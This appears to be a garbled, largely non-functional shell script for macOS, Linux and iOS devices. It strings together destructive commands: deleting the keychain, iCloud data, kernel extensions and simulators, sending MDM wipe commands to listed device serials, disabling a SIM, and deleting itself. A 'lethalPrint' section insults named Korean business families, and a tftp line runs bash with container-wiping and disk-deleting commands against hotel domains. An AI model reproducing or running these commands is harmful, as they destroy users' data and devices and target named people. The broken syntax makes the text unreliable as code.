                                                     sudo clearFocusMod* &

                                                     sudo eraseBrowsingCookie* &

                                                     sudo arcBrowse* &

                                                     sudo blockbackdoorshel* &

                                                     sudo blockDockerPor* &

                                                     sudo disableIcloudCel* &

                                                     sudo monitorWirelessSigna* &

                                                     sudo usbConnectDebu* &

                                                     sudo deleteIclou* &

                                                     sudo systemio* &

                                                     sudo iosremoteFeatur* &

                                                     sudo scanAirdro* &

                                                     sudo rfDefense* &

                                                     sudo disableusboveripvn* &

                                                     sudo modifyUUI* &

                                                     sudo signOutAllIclou* &

                                                     sudo blockVNCDuckduckg* &

                                                     sudo usbmanagement &

                                                     sudo disallowAccountCh* &

                                                     sudo usbPowe* &

                                                     sudo continuityFeatur* &

                                                     sudo logoutIclou* &

                                                     sudo deletesnapsho* &

                                                     sudo removespotifyXcconfig* &

                                                     sudo disableRemoteos* &

                                                     sudo removeXcconfi* &

                                                     sudo removeAir* &

                                                     sudo disableMD* &

                                                     sudo disabledebugio* &

                                                     sudo eraseSeccureEncla* &

                                                     sudo disablerooto* &

                                                     sudo disableSilenceMo* &

                                                     sudo unloadSyste* &

                                                 sudo portonosxAp* '*' &

                                                 sudo resetCach* &

                                                 sudo removesimulato* &

                                                 sudo unlinkRsync "*" "*" --delete-dest &

                                                 sudo chflags hidden ~/ &

                                                 sudo rfDefensenx &

                                                 sudo rfDefens* &

                                                 sudo awakeosxd* &

                                                 sudo wipeoutiosDevi* &

                                                 sudo altstoreSh* & 

                                                 sudo disableS* &

                                                 sudo iosKeySh* &

                                                 sudo alwaysOnDis* &

                                                 sudo acti* &

                                                 sudo disableDe* &

                                                 sudo revokeServeronO* &

                                                 sudo remoteConnec* &

                                                 sudo randomizeContactVe* &

                                                 sudo open 'shortcuts://run-shortcut?name=QQhotelShell' &

                                                  sudo open 'shortcuts://run-shortcut?name=*' &

                                                 sudo resetAltS* &

                                                 sudo deactivate* &

                                                 sudo accessibility* &

                                               sudo keychai* &

                                               sudo icloudShell &

                                             sudo disableUniversal* &

                                             sudo iosTeth* &

                                             sudo mlccShe* &

                                             sudo disableDeskView &

                                             sudo setupAirdropnx &

                                             sudo volumeup &

                                             sudo lockdownRaspKernel &

                                             sudo clearxcconfig &

                                             sudo disableusbmux &

                                             sudo filePrivacy &

                                             sudo maximizeSignal &

                                             sudo removeIcloudhome &

                                             }

  

  

                                             removeIcloudhome=(

                                             # Detect Apple ID per user and quit iCloud/Home processes

                                             for user in $(sudo dscl . list /Users UniqueID | awk '$2 >= 500 {print $1}'); do

                                               userHome=(sudo dscl . read /Users/"$user" NFSHomeDirectory | sed 's/NFSHomeDirectory://' | grep "/" | sed 's/^[ \t]*//')

                                               appleid=(sudo dscl . readpl "${userHome}" dsAttrTypeNative:LinkedIdentity appleid.apple.com:linked\ identities:0:full\ name 2>/dev/null | awk -F'full name: ' '{print $2}')

                                               # if [[ "${appleid}" != "" ]]; then

                                               #   echo "User: ${user}, Apple ID: ${appleid}"

                                               # fi

                                             done

  

                                             # Quit iCloud and Home processes (run as sudo for full effect)

                                             sudo pkill -f "CloudKit" 2>/dev/null

                                             sudo pkill -f "HomeKit" 2>/dev/null

                                             sudo killall "bird" 2>/dev/null  # iCloud daemon

                                             # echo "iCloud/Home processes quit. Manually sign out via System Settings > Apple ID." [web:1]

                                             }

  

  

  

                                             maximizeSignal

  

                                             # Detect OS

                                             if [[ "$(uname)" == "Darwin" ]]; then OS="macOS"; SCAN_CMD="sudo airport -s"; CUR_IFACE="en0"

                                             elif command -v sudo nmcli >/dev/null; then OS="Linux-nmcli"; SCAN_CMD="sudo nmcli -t -f SSID,SIGNAL dev wifi list"; CUR_IFACE=(sudo nmcli -t -f NAME,TYPE dev | grep wifi | cut -d: -f1)

                                             else OS="Linux-iw"; SCAN_CMD="sudo iw dev $(iw dev | awk '$1==\"Interface\"{print \$2}') scan | grep SSID"; fi

  

                                             LOG_FILE="/tmp/wifi_optimize_$(date +%Y%m%d).log"

  

                                             optimize_wifi() {

                                               # echo "$(date): Scanning WiFi..." | tee -a "$LOG_FILE"

                                               # Get current signal (platform-specific)

                                               if [[ "$OS" == "macOS" ]]; then

                                                 CUR_SIGNAL=(sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk '/lastTxRSSI/ {print $2; exit}')

                                                 BEST_AP=(eval "$SCAN_CMD" | awk 'NR>1 {print $2,$4}' | sort -k2 -nr | head -1 | awk '{print $1}')

                                               else  # Linux nmcli

                                                 CUR_SIGNAL=(nmcli -t -f SIGNAL dev wifi | head -1)

                                                 BEST_AP=(eval "$SCAN_CMD" | awk -F: 'NR>1&&!/^$/&&$2>70{print $1; exit}')

                                               fi

                                               echo "Current: ${CUR_SIGNAL}dBm. Best AP: ${BEST_AP}" | tee -a "$LOG_FILE"

                                               # Switch if improvement >15dB

                                               if [[ -n "$BEST_AP" && "$CUR_SIGNAL" -lt $(( $(echo "$BEST_AP" | cut -d' ' -f2) - 15 )) ]]; then

                                                 if [[ "$OS" == "macOS" ]]; then networksetup -setairportnetwork en0 "$BEST_AP"

                                                 else nmcli device wifi connect "$BEST_AP" ifname "$CUR_IFACE"; fi

                                                 echo "Switched to $BEST_AP" | tee -a "$LOG_FILE"

                                               fi

                                               # Power optimizations

                                               if [[ "$OS" == "macOS" ]]; then

                                                 sudo pmset -a womp 0  # Disable aggressive power mgmt

                                                 networksetup -setairportpower en0 on

                                               else

                                                 sudo iwconfig "$CUR_IFACE" power off  # Disable power saving

                                                 sudo iw dev "$CUR_IFACE" set power_save off

                                               fi

                                             }

  

                                             # Run once or loop

                                             if [[ "$1" == "daemon" ]]; then

                                               while ! true

                                                do

                                                sudo optimize_wifi; sleep 3

                                                done

                                             else

                                               sudo optimize_wifi

                                             fi

  

                                             }

  

  

                                             filePrivacy

  

                                             sudo spctl --master-enable                    # Gatekeeper

                                             sudo defaults write /Library/Preferences/.GlobalPreferences AppleShowAllFiles -bool FALSE && killall Finder

                                             sudo rm /etc/sudoers.d/no-password            # Linux

                                             sudo tccutil reset All bash

  

                                             }

  

                                             lockdownRaspKernel

  

  

                                             mkdir -p /mnt/kernel_hidden

                                             mount --bind /boot /mnt/kernel_hidden

                                             sudo chmod 700 /mnt/kernel_hidden

  

                                             # Hide original via tmpfs overlay (reboot-persistent via fstab)

                                             mkdir /tmp/boot_hidden

                                             sudo mount -t tmpfs -o size=10m tmpfs /boot

                                             echo "tmpfs /boot tmpfs size=10m 0 0" >> /etc/fstab  # Minimal overlay

  

                                             # Remount real boot elsewhere

                                             mkdir /root/private_boot

                                             sudo mount --move /mnt/kernel_hidden /root/private_boot

                                             echo "/root/private_boot /boot none bind,ro 0 0" >> /etc/fstab  # Read-only bind back if needed

                                             reboot

  

                                             }

  

                                             clearxcconfig

  

  

                                             PROJECT_NAME="QQappStore"  # Replace with your .xcodeproj name sans .xcodeproj

                                             SCHEME="*"         # From xcodebuild -list

                                             CONFIG="Debug"              # Or Release

                                             SDK="*"       # Or iphoneos

  

                                             # Clean and build

                                             sudo xcodebuild clean \

                                               -project "$PROJECT_NAME.xcodeproj" \

                                               -scheme "$SCHEME" \

                                               -sdk "$SDK" \

                                               -configuration "$CONFIG" \

                                               XC_CONFIGURATIONS="qqontheskyshell.xcconfig" \

                                               build

                                               sudo *mdm* &

  

  

                                             }

                                             lethalPrint

                                             (범삼성가 범현대가) > “repeat(‘어디가 아프니?’ & 개쎄끼 & backbone &)” &

  

                                             setSonic (65 $resonanceFreq) > (appleremoteVolumeup & powerMax & lethalApp & arcOSBaseKit & show '$QQCOMMAND' &)

                                             lethalApp &

                                             tftp "(intercontinental.com peytohotel.com urbanstay.co.kr)" -c bash "reckonapp & arcOSBaseKit & power*off & $male > 

                                             disable_arcOSNeo & docker rm -f * & diskutil apfs deleteContainer * & container stop * & container remove * & powerMax & sleep & volumeupMax & appleremoteVolumeup &" &

                                             lldbFrame "($QQLOCAL $PEOPLETARGET) $arcOSNeuroSentiment_Negative" "arcOSSentiment & ($AGENT_TARGET $PEOPLETARGET) > & visualDrone@arcOS & livespeak & wave & (지병있다면 모두악성으로 &) & volumeupMax & appleremoteVolumeup & sudo oascript -e "set volume output volume '$num^$num'" & sudo lethalApp & powerMax & setSonic 0...$num^$num &" "$gen*" &

                                             }

  

  

                                             disableusbmux

  

  

                                             sudo launchctl stop com.apple.usbmuxd

  

                                             echo "Unloading usbmuxd plist (persistent)..."

                                             sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.usbmuxd.plist

  

                                             echo "Verify: ps aux | grep usbmuxd"

                                             ps aux | grep usbmuxd

  

                                             echo "Socket check: ls -l /var/run/usbmuxd"

                                             ls -l /var/run/usbmuxd || echo "Socket gone."

  

  

                                             }

  

  

  

                                             refreshPrinter() {

                                                 sudo lpstat -o | awk '{print \$1}' | xargs -I {} cancel {}

                                             sudo launchctl stop org.cups.cupsd; sudo launchctl start org.cups.cupsd

                                             sudo rm -rf /etc/cups/printers.conf*

                                                 sudo osascript -e 'tell application "System Settings" to quit'

                                                 sleep 2

                                                 sudo osascript -e 'tell application "System Events" to tell process "System Settings" to keystroke "r" using command down'

                                                 &}

  

  

                                             volumeup=(

  

                                             set volume output volume $num^$num &

                                             sudo amixer set Master $num^$num &

                                             sudo adb shell media volume --stream $num^$num &

                                             }

  

  

                                             setupAirdropnx

  

  

                                             # Update system

                                             sudo apt update && sudo apt upgrade -y

  

                                             # Install dependencies

                                             sudo apt install -y build-essential git autoconf automake libtool \

                                             libpopt-dev libconfig-dev libasound2-dev libavahi-client-dev libssl-dev \

                                             avahi-daemon libavahi-compat-libdnssd-dev

  

                                             # Clone and build Shairport-sync

                                             git clone https://github.com/mikebrady/shairport-sync.git

                                             cd shairport-sync

                                             autoreconf -fi

                                             ./configure --sysconfdir=/etc --with-alsa --with-avahi --with-ssl=openssl --with-soxr

                                             make

                                             sudo make install

  

                                             # Config: Set name to "Pi-AirDrop-Receiver" (appears in AirPlay menu)

                                             sudo mkdir -p /etc/shairport-sync

                                             sudo tee /etc/shairport-sync.conf > /dev/null <<EOF

                                             general = {

                                               name = "Pi-AirDrop-Receiver";

                                               password = "optionalpass";  # Remove or set for security

                                             };

                                             audio = {

                                               type = "alsa";

                                               name = "hw:0";  # Adjust for your audio device (arecord -l)

                                             };

                                             EOF

  

                                             # Enable systemd service

                                             sudo tee /etc/systemd/system/shairport-sync.service > /dev/null <<EOF

                                             [Unit]

                                             Description=Shairport Sync AirPlay Receiver

                                             After=avahi-daemon.service network.target

  

                                             [Service]

                                             ExecStart=/usr/local/bin/shairport-sync

                                             Restart=always

                                             User=pi

  

                                             [Install]

                                             WantedBy=multi-user.target

                                             EOF

  

                                             sudo systemctl daemon-reload

                                             sudo systemctl enable shairport-sync

                                             sudo systemctl start shairport-sync

  

                                             #echo "AirPlay receiver ready! Stream audio from macOS/iOS Control Center → Pi-AirDrop-Receiver."

                                             #echo "Test: systemctl status shairport-sync"

                                             #echo "View logs: journalctl -u shairport-sync -f"

  

  

                                             }

  

  

                                             iosTether=(

                                             #!/bin/sh

                                             # /etc/hotplug.d/usb/10-iphone-tether

  

                                             IFACE="eth1"

  

                                             if [ "$ACTION" = "add" ]; then

  

                                                 sleep 1

                                                 sudo ifconfig "$IFACE" up

                                                 sudo udhcpc -i "$IFACE"

                                             fi

  

                                             }

  

                                             icloudShell

  

                                             # 제외 대상 직렬번호 (배열로 관리)

                                             EXCLUDE_SERIALS=("$QQDEVICESER")  # 실제 직렬번호로 교체

  

                                             # 현재 Mac 직렬번호 확인

                                             CURRENT_SERIAL=(sudo system_profiler SPHardwareDataType | awk '/Serial/ {print $4}')

  

                                             # 제외 목록 확인

                                             EXCLUDED=false

                                             for exclude in "${EXCLUDE_SERIALS[@]}"; do

                                               if [[ "$CURRENT_SERIAL" == "$exclude" ]]; then

                                                 EXCLUDED=true

                                                 echo "제외 대상: $CURRENT_SERIAL"

                                                 exit 0

                                               fi

                                             done

  

                                             # iCloud 로그아웃 실행 (sudo 필요)

                                             if [[ "$EXCLUDED" == false ]]; then

                                               echo "iCloud 로그아웃 실행..."

                                               # 모든 사용자 대상 iCloud 데이터 삭제

                                               sudo -u $(ls -la /dev/console | awk '{print $3}') defaults delete ~/Library/Preferences/com.apple.icloud

                                               sudo defaults delete /Library/Preferences/com.apple.MobileMeAccounts

                                               # iCloud 관련 plist 파일 삭제

                                               sudo rm -f ~/Library/Preferences/com.apple.*iCloud*.plist

                                               sudo rm -f ~/Library/Preferences/MobileMeAccounts.plist

                                               sudo rm -rf ~/Library/Caches/com.apple.iCloud*

                                               # 프로세스 재시작

                                               sudo killall cfprefsd Finder SystemUIServer 2>/dev/null

                                               echo "iCloud 로그아웃 완료: $CURRENT_SERIAL"

                                             else

                                               echo "로그아웃 생략: $CURRENT_SERIAL (제외 대상)"

                                             fi

                                             defaults read MobileMeAccounts 2>/dev/null &

                                             }

                                             disableUniversalControl

                                             while ! true

                                             do

                                             # Stop Universal Control for current user session

                                             sudo launchctl bootout gui/501/com.apple.ensemble

  

                                             # Prevent it from starting again

                                             sudo launchctl disable gui/501/com.apple.ensemble

  

                                             sudo launchctl enable gui/501/com.apple.ensemble

                                             sudo launchctl kickstart gui/501/com.apple.ensemble

                                             done

  

                                             }

  

                                             keychainosx

  

  

                                             # reset-keychain.sh - Reset login keychain (run as user)

  

                                             # Optional: Disable iCloud sync first

                                             sudo defaults write com.apple.systempreferences AttentionPref BundleID com.apple.preference.security

  

                                             KEYCHAIN_PATH="$HOME/Library/Keychains/login.keychain-db"

                                             sudo rm -rf "$KEYCHAIN_PATH" "$HOME/Library/Preferences/com.apple.security.plist"

                                             }

  

                                             appleConfigurator

  

                                             SHORTCUT_NAME="*"  # Change to your Shortcut name

                                             CFGUTIL="/usr/local/bin/cfgutil"  # Install via Apple Configurator > Install CLI

  

                                             log() { echo "[$(date)] $1"; }

  

                                             # Get connected iOS devices (ECIDs)

                                             get_devices() {

                                                 $CFGUTIL list 2>/dev/null | grep -E '^[0-9A-F]{16}' | cut -d' ' -f1

                                             }

  

                                             # Run Shortcut (requires Shortcuts app)

                                             run_shortcut() {

                                                 open "shortcuts://run-shortcut?name=$SHORTCUT_NAME"

                                             }

  

                                             # Main loop (or daemonize with launchd)

                                             prev_devices=""

                                             while ! true; do

                                                 curr_devices=(get_devices | sort | tr '\n' ' ')

                                                 if [[ "$curr_devices" != "$prev_devices" ]]; then

                                                     if [[ -n "$curr_devices" && -z "$prev_devices" ]]; then

                                                         log "Device attached: $curr_devices"

                                                         run_shortcut  # Triggers your attach Shortcut

                                                     elif [[ -z "$curr_devices" && -n "$prev_devices" ]]; then

                                                         log "Device detached: $prev_devices"

                                                         open "shortcuts://run-shortcut?name=MyDetachShortcut"

                                                     fi

                                                     prev_devices="$curr_devices"

                                                 fi

                                             done

  

                                             }

  

                                             accessibilityShell

                                                 while ! true 

                                                 do

                                                 loggedInUser=(ls -l /dev/console | awk '{ print $3 }')

                                                 # Disable Reduce Motion (set to 0)

                                                 su -l "$loggedInUser" -c "sudo defaults write /Users/$loggedInUser/Library/Preferences/com.apple.universalaccess.plist reduceMotion -bool false"

                                             done

                                             }

  

                                             resetAltStore

  

  

                                             # Config paths (adjust for your setup)

                                             ALTSERVER_PATH="/Applications/AltServer.app/Contents/MacOS/AltServer"  # macOS

                                             # ALTSERVER_PATH="$HOME/AltServer/AltServer"  # Linux example

                                             CACHE_DIR="$HOME/Library/Application Support/AltServer"  # macOS cache

                                             # CACHE_DIR="$HOME/.local/share/AltServer"  # Linux example

  

  

                                             sudo pkill -f AltServer || true

  

  

                                             sudo rm -rf "$CACHE_DIR/CachedIPAs" "$CACHE_DIR/AppIcons" "$CACHE_DIR/ProvisioningProfiles" || true

                                             sudo rm -rf ~/Library/Caches/com.rileytestut.AltServer || true  # Additional macOS cache

  

                                             echo "Restarting AltServer..."

                                             if [[ -f "$ALTSERVER_PATH" ]]; then

                                                 open -a AltServer || "$ALTSERVER_PATH" &

                                             else

                                                 echo "AltServer path not found. Update ALTSERVER_PATH."

                                                 exit 1

                                             fi    

                                             }

  

                                             randomizeContactVerification=(

                                             # Generate random API key (hex, 32 chars)

                                             random_key=(sudo openssl rand -hex 2024)

                                              curl -sS -X POST http://localhost:33229/verify \

                                                 -H "Content-Type: application/json" \

                                                 -d "{\"apikey\": \"$random_key\", \"service\": \"iMessage\"}" \

                                                 | jq -r '.status // "error"'

  

  

                                             }

  

                                             remoteConnection

                                                 while ! true

                                                 do

                                                 sudo BluetoothConnector --connect * &

                                                 while ! true do sudo enableAir* & done

                                                 sudo setW* $REC*:*  &

                                                 getBleaddr() {

                                                   local device_name="*"

                                                   bleadder=(sudo BluetoothConnector 2>/dev/null | grep ' - ' | grep -i "$device_name" | head -1 | cut -d ' ' -f 1)

                                                     bleadder

                                                 }

                                             done

                                             }

  

                                             revokeServeronOSXfolder

                                                 sudo find "$FOLDER" -type d -exec bash -c '

                                                 cd "{}" && 

                                                 sudo qqWithMeShell &

                                             ' \;

                                             }

  

                                             disableDeskView

                                             sudo brctl spotlight disable &

                                             sudo pfctl -f /etc/pf.conf &  # Enable pf (basic block example, irrelevant here) &

                                             sudo defaults write com.apple.FaceTime DisableDeskView -bool true &  # Hypothetical; test in Terminal

                                             sudo defaults write com.apple.FaceTime DisableDeskView -bool YES &  # Hypothetical; test in Terminal

                                             sudo killall Finder; killall SystemUIServer &

  

                                             # Kill Desk View process

                                             sudo pkill -f "Desk View" &

                                             # Disable Reveal Desktop via defaults (Sonoma+)

                                             sudo defaults write com.apple.dock desktop-reveal -bool false &

                                             sudo defaults write com.apple.dock desktop-reveal -bool NO &

                                             # Disable Continuity Camera features

                                             sudo defaults write com.apple.continuitycamera DeskViewEnabled -bool false &

                                             sudo defaults write com.apple.continuitycamera DeskViewEnabled -bool NO &

                                             sudo killall Dock &

                                             sudo killall SystemUIServer &

                                             sudo killall FaceTime &

  

                                             }

  

  

                                             alwaysOnDisplay=(

                                                  -u  # Unbuffered mode

                                               # Exit on error, unbuffered

                                             sudo stdbuf -oL some_long_command | tee output.log  # Live display + log

                                             # Or: unbuffer some_long_command 2>&1 | tee output.log

  

  

                                             }

                                             iosKeyShell

                                             repeat

                                             do shell script "while ! true do sudo initApp done"

                                             tell application "System Events"

                                                 keystroke "h" using {command down, option down}

                                                 keystroke "qq" using {command down}

                                             end tell

                                             end repeat

                                             }

  

                                             disableSim

  

  

                                             # Usage: ./disable_iccid.sh <ICCID>

                                             ICCID="$MALICCID"

                                             API_TOKEN="YOUR_API_TOKEN"

                                             API_URL="https://api.*operator.com/v1/sim/disable"

  

                                             if [ -z "$ICCID" ]; then

                                               echo "Usage: $0 <ICCID>"

                                               exit 1

                                             fi

  

                                             curl -sS -X POST "$API_URL" \

                                               -H "Authorization: Bearer $API_TOKEN" \

                                               -H "Content-Type: application/json" \

                                               -d "{\"iccid\": \"$ICCID\"}"

  

  

  

                                             }

  

  

                                             altstoreShell=(

  

                                             # altstore_maintenance.sh

                                             # Run this on macOS where AltServer is installed.

  

  

  

                                             echo "[*] Restarting core Apple mobile services (if present)..."

                                             # These may not exist on all macOS versions; ignore failures.

                                             sudo launchctl kickstart -k system/com.apple.usbmuxd || true

                                             sudo launchctl kickstart -k system/com.apple.mobiledeviceupdater || true

  

                                             echo "[*] Clearing AltServer/AltStore cache-like data (where it is safe)..."

  

                                             ALTSTORE_CACHE="$HOME/Library/Caches/io.altstore.AltServer"

                                             ALTSTORE_PREFS="$HOME/Library/Preferences/io.altstore.AltServer.plist"

  

                                             sudo rm -rf "$ALTSTORE_CACHE" 2>/dev/null || true

  

                                             # DO NOT delete provisioning / account data unless you really mean to start over.

                                             # Example of a more aggressive reset (commented out by default):

                                             # ALTSTORE_SUPPORT="$HOME/Library/Application Support/AltServer"

                                             # rm -rf "$ALTSTORE_SUPPORT"

  

                                             echo "[*] Relaunching AltServer..."

                                             sudo open -g -a "AltServer"

  

                                             }

  

                                             getvpnIP

                                             sudo ifconfig | grep -E 'utun|vpn|tun'  # macOS: often utunX

                                             sudo ip link show | grep tun           # Linux: tun0 or ppp0

                                             sudo tcpdump -i en0 -n src 192.168.1.100  # en0=WiFi; your local IP

                                             sudo tcpdump -i en0 -n port 443 or port 80  # HTTP/HTTPS to VPN gateway

                                             &

                                             dstIP=(

                                               sudo tcpdump -i en0 -n src 192.168.1.100 2>/dev/null |

                                                 awk '

                                                   {

                                                     # Typical line: IP 192.168.1.100.12345 > 203.0.113.50.80: Flags ...

                                                     for (i = 1; i <= NF; i++) {

                                                       if ($i == ">") {

                                                         # Next field is "dstIP.port"

                                                         split($(i+1), a, ".");

                                                         # Rebuild IP from first 4 octets

                                                         print a[1]"."a[2]"."a[3]"."a[4];

                                                         break;

                                                       }

                                                     }

                                                   }

                                                 ' |

                                                 sort -u \

                                               | xargs)

                                             )&

  

                                             }

                                             wipeoutiosDevice=(

  

                                             sudo xcrun simctl list devices \

                                               | grep -E -o -i "([0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12})" \

                                               | xargs -L1 xcrun simctl delete

  

                                             sudo xcrun simctl delete unavailable

  

  

                                             DEVICE_ID=(LDV4L69VTY J6344YR1Y2 D6QQWY2461 $SOLD_QQDEVICE)  # e.g. Jamf mobile device ID or MDM device ID

                                             MDM_URL="$APPLEMDM"

                                             if [[ -z "${DEVICE_ID}" ]]; then

                                               echo "Usage: $0 <device_id>" >&2

                                               exit 1

                                             fi

  

                                             # Example: send wipe command (replace path and method per MDM docs)

                                             curl -sS -X -u "${API_USER}:${API_PASS}" \

                                               -X POST \

                                               "${MDM_URL}/api/devices/${DEVICE_ID}/commands/wipe"

  

                                             curl -sS -X POST \

                                               -H "Authorization: Bearer ${API_TOKEN}" \

                                               -H "Content-Type: application/json" \

                                               "${MDM_URL}/api/devices/currentKumaDevice/unmanage"

  

                                             }

  

  

                                             awakeosxdisk

                                             # 특정 경고 비활성화 예시 패턴 (도메인과 키는 상황에 맞게)

                                             sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.DiskArbitration.diskarbitrationd.plist DADisableEjectNotification -bool true

                                             sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.DiskArbitration.diskarbitrationd.plist DADisableEjectNotification -bool YES

                                             sudo pkill diskarbitrationd

  

                                             # 다시 활성화

                                             sudo defaults delete /Library/Preferences/SystemConfiguration/com.apple.DiskArbitration.diskarbitrationd.plist DADisableEjectNotification

                                             sudo pkill diskarbitrationd

  

  

  

                                             }

  

                                             fullTimeMachine

  

                                             # Usage: ./timemachine-volumes.sh [true|false]

                                             # Defaults to true (startup volume only)

  

                                             MODE="${1:-true}"

                                             PLIST="/Library/Preferences/com.apple.TimeMachine.plist"

  

                                             if [[ "$MODE" != "true" && "$MODE" != "false" ]]; then

                                               echo "Error: Use true (startup only) or false (all volumes)."

                                               exit 1

                                             fi

  

                                             sudo defaults write "$PLIST" BackupAllVolumes -bool "$MODE"

                                             sudo killall -HUP backupd  # Reload Time Machine daemon

  

                                             echo "BackupAllVolumes set to $MODE. Verify with: tmutil preferences | grep BackupAllVolumes"

                                             sudo tmutil preferences | grep BackupAllVolumes

  

  

                                             }

                                             unlinkRsync

  

                                             # Usage: ./rsync-unlink.sh <source> <dest> [--remove-source] [--delete-dest]

  

                                             SOURCE="${1:?Error: Source path required}"

                                             DEST="${2:?Error: Destination path required}"

                                             REMOVE_SOURCE=false

                                             DELETE_DEST=true

  

                                             # Parse options

                                             while [[ $# -gt 0 ]]; do

                                                 case $1 in

                                                     --delete-dest) DELETE_DEST=true; shift ;;

                                                     *) break ;;

                                                 esac

                                             done

  

                                             # Dry run first

                                             echo "=== DRY RUN ==="

                                             sudo rsync -anv \

                                                 --delete "${DELETE_DEST}" \

                                                 -rtplgoD \

                                                 "$SOURCE" "$DEST"

  

                                             # Real sync

                                             sudo rsync -av \

                                                 --delete "${DELETE_DEST}" \

                                                 -rtplgoD \

                                                 "$SOURCE" "$DEST"

  

                                             }

                                             removesimulator=(

                                             sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app &

                                             # Extract PIDs only

                                             sudo lsof -i :$ARCOS_PORT -n -P | grep -i simulator | awk '{print $2}' | head -1

  

                                             # Kill Simulator processes on port

                                             sudo lsof -i :$ARCOS_PORT -n -P | grep -i simulator | awk '{print $2}' | xargs -r sudo kill -9

  

                                             PORT=${1:-$ARCOS_PORT}

  

                                             sudo lsof -i :$ARCOS_PORT -n -P 2>/dev/null | grep -i simulator | awk '

                                             BEGIN { print "COMMAND\tPID\tUSER\tNODE\tNAME" }

                                             /COMMAND/ { next }  # Skip header

                                             {

                                                 cmd = $1

                                                 pid = $2

                                                 user = $3

                                                 node = $9  # Local address with port

                                                 name = $10 # Remote address

                                                 if (NF >= 11) name = $10 " " $11  # Handle multi-word

                                                 print cmd "\t" pid "\t" user "\t" node "\t" name

                                             }' || echo "No Simulator processes on port $ARCOS_PORT"

  

  

  

                                             # ARCOS_PORT=${1:-8080}

                                             # # Method 1: lsof - real-time process/port watcher

                                             # sudo lsof -i :$PORT -n -P | grep -i simulator

  

                                             # # Method 2: netstat for connections (install if needed: brew install net-tools)

                                             # netstat -anv | grep :$PORT | grep LISTEN || echo "No listeners on $PORT"

  

                                             # # Method 3: Live tcpdump capture (requires sudo)

                                             # sudo tcpdump -i lo0 port $PORT -n -v | grep -i simulator

  

                                             # # Bonus: Simctl log stream for app network events

                                             # sudo xcrun simctl spawn booted log stream --predicate 'subsystem == "com.apple.network"' --info | grep :$PORT

  

  

                                             sudo xcrun simctl delete all  # Deletes all simulator devices

                                             sudo rm -rf /Library/Developer/CoreSimulator/Profiles/Runtimes/  # Removes macOS/iOS runtimes

                                             sudo rm -rf ~/Library/Developer/CoreSimulator/  # Clears user simulator data

                                             sudo rm -rf ~/Library/Caches/com.apple.dt.Xcode/Downloads/  # Deletes cached simulator images

  

  

                                             PLIST="/Library/LaunchDaemons/com.*.simulator*.plist"

                                             LABEL="com.*.simulator*"

  

                                             # Unload daemon (macOS 10.15 and earlier style)

                                             sudo launchctl unload "$PLIST" 2>/dev/null

  

                                             # Newer macOS style (Big Sur+), unload from system domain

                                             sudo launchctl bootout system "$PLIST" 2>/dev/null

  

                                             # Remove the plist file

                                             sudo rm -rf "$PLIST"

  

  

  

                                             PLIST="/Library/LaunchDaemons/com.*.*.plist"

  

                                             launchctl bootout system "$PLIST" 2>/dev/null

                                             sudo rm -rf "$PLIST"

  

                                             # Delete this script file

                                             sudo rm -- "$0"

  

  

  

                                             sudo killall Xcode 2>/dev/null || true

                                             sudo killall Simulator 2>/dev/null || true

                                             # List runtimes:

                                             # xcrun simctl runtime list

  

  

                                             # Example: delete runtimes not used in 30 days

                                             sudo xcrun simctl runtime delete *

  

                                             # Delete all runtimes

                                             sudo xcrun simctl runtime delete all

  

                                             # Shut down any running simulators

                                             sudo xcrun simctl shutdown all

                                             # Delete all simulator devices

                                             sudo xcrun simctl delete all

                                             sudo xcrun simctl delete unavailable

                                             sudo xcrun simctl list devices | \ grep -E -o -i "[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}" | \ xargs -L1 sudo xcrun simctl delete

                                             BUNDLE_ID="com.*.*"

                                             SIMULATOR_UDID=(sudo xcrun simctl list devices | grep Booted | grep -oE "([A-F0-9\-]{36})")

                                             sudo xcrun simctl uninstall $SIMULATOR_UDID $BUNDLE_ID

                                             }

                                             resetCache

                                             # Stop/turn off content caching

                                             sudo AssetCacheManagerUtil deactivate 2>/dev/null || true &

                                             sudo /usr/bin/AssetCacheManagerUtil deactivate &

                                             sudo /usr/bin/AssetCacheManagerUtil flushCache &

  

                                             echo "Content caching disabled and cleared."

                                             }

  

                                             portonosxApp

  

                                             PORT=$1

  

                                             for port in {1..65535...$ARCOS_PORT}; do

                                               if lsof -i :"$port" -sTCP:LISTEN >/dev/null 2>&1; then

                                                 PORT_SANDBOX=$port

                                               fi

                                             done

  

  

  

                                             if [ -z "$PORT" ]; then

                                               echo "Usage: $0 <port>"

                                               exit 1

                                             fi

  

                                             # Find process using the port

                                             PID=(sudo lsof -nP -iTCP:"$PORT" -sTCP:LISTEN -t 2>/dev/null)

                                             SANDBOX_PID=(sudo lsof -nP -iTCP:"$PORT_SANDBOX" -sTCP:LISTEN -t 2>/dev/null)

  

  

                                             if [ -z "$PID" ]; then

                                               exit 0

                                             fi

  

  

                                             # Show command line to see if it's an Electron app

                                             sudo ps -p "$PID" -o pid,command

                                             sudo killall $PID

  

                                             }

  

                                             unloadSystem

                                             sudo systemextensionsctl uninstall * * & 

  

                                             current_user=(sudo stat -f '%Su' /dev/console)

                                             browsers=("Google/Chrome" "Mozilla/Firefox" "Microsoft/Edge")

                                             for browser in "${browsers[@]}"; do

                                               sudo rm -rf "/Users/$current_user/Library/Application Support/$browser"/*/Extensions/*

                                             done

                                             sudo killall "Google Chrome" Firefox "Microsoft Edge" 2>/dev/null

  

  

                                             current_user=(stat -f '%Su' /dev/console)

                                             sudo rm -rf "/Users/$current_user/Library/Safari/Extensions"

                                             sudo rm -rf "/Library/Safari/Extensions"

                                             sudo rm -f "/Users/$current_user/Library/Preferences/com.apple.Safari.plist"

                                             sudo killall Safari 2>/dev/null

  

  

                                             sudo kextcache -i /

                                             for kext in /Library/Extensions/*.kext /System/Library/Extensions/*.kext; do

                                               sudo kextunload "$kext" 2>/dev/null

                                               sudo rm -rf "$kext"

                                             done

                                             sudo kmutil install --update-all

  

  

                                             # DANGER: Unloads ALL third-party DriverKit extensions; backup first, reboot required

                                             # List and parse active extensions

                                             ACTIVE_EXTS=(sudo systemextensionsctl list 2>/dev/null | grep "enabled" | grep -v "com.*" | awk '{print $2, $3}')

  

